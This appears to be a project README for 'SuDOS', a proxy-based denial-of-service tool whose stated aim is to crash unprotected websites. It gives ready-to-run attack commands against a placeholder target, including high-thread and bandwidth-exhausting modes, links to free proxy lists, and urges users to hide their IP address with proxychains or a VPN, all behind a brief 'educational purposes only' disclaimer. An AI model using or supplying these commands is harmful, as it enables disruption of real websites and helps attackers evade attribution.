# SuDOS

**SuDOS** or Super Denial of Service is a proxy-based DoS tool used to crash unprotected websites from this kind of attack. It is highly recommended to use proxychains or VPN while using this tool to hide your own IP address from proxy servers or even from your target.

Join our Discord: https://discord.com/invite/dZSDbjJPHx

# Disclaimer
- This tool is for educational purposes only.
- I will not be responsible for any damage this tool cause. Use it at your own risk!
- This tool is in early version. Many bugs may occur!

# Usages
- Basic usage
```
python sudos.py -z socks5 -x socks5_list.txt https://target.com/
```
- Harder testing usage
```
python sudos.py -z socks5 -x socks5_list.txt -t 500 -c 0 https://target.com/
```
- Server bandwidth consuming test
```
python sudos.py -z socks5 -x socks5_list.txt -c 0 -n https://target.com/
```

# Where do I get proxy lists?
Just click the links below and find a best proxy list for yourself.
- https://openproxy.space/list
- https://www.proxy-list.download/
- https://www.proxyscrape.com/free-proxy-list

# Screenshots
<img src="https://raw.githubusercontent.com/lilmond/sudos/main/screenshots/sudos_6.png" width=300/>
<img src="https://raw.githubusercontent.com/lilmond/sudos/main/screenshots/sudos_1.jpg" width=300/>
<img src="https://raw.githubusercontent.com/lilmond/sudos/main/screenshots/sudos_5.jpg" width=300/>
<img src="https://raw.githubusercontent.com/lilmond/sudos/main/screenshots/sudos_4.png" width=300/>
